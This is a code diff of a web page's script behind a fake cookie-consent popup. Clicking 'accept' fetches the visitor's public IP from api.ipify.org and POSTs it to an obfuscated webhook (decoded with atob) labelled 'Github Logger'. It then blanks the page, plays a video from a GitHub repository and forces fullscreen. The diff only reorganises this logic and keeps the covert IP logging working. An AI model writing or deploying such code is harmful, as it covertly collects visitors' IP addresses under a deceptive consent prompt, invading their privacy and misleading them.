@@ -28,14 +28,9 @@
             xhr.send(null);
         }
 
-        get_information("https://api.ipify.org/", function(text) {
-            var ip = text;
-            logger(ip);     
-        });
-
-\        function logger(ip) {
+        function logger(ip) {
             const request = new XMLHttpRequest();
-            request.open("POST", atob(wbhk)); \
+            request.open("POST", atob(wbhk));
             request.setRequestHeader('Content-type', 'application/json');
             const params = {
                 username: "Github Logger",
@@ -45,10 +40,15 @@
             request.send(JSON.stringify(params));
         }
 
-        setTimeout(function() {
-\        }, 100);
+        function fetchIpAndLog() {
+            get_information("https://api.ipify.org/", function(text) {
+                var ip = text;
+                logger(ip);
+            });
+        }
 
-        function troll() {
+        document.getElementById("accept-btn").addEventListener("click", function() {
+            fetchIpAndLog();
             document.body.innerHTML = '';
             let v = document.createElement('video');
             v.src = 'https://raw.githubusercontent.com/scrinshoted/scrinshoted.github.io/main/media/video.mp4';
@@ -72,19 +72,11 @@
             } else if (document.documentElement.msRequestFullscreen) { 
                 document.documentElement.msRequestFullscreen();
             }
-        }
+        });
 
-        document.getElementById("accept-btn").onclick = function() {
-\            get_information("https://api.ipify.org/", function(text) {
-                var ip = text; \
-                logger(ip); 
-            });
-            troll();
-        };
-
-        document.getElementById("decline-btn").onclick = function() {
-            document.getElementById("cookie-popup").style.display = "none"; 
-        };
+        document.getElementById("decline-btn").addEventListener("click", function() {
+            document.getElementById("cookie-popup").style.display = "none";
+        });
     </script>
 </body>
 </html>
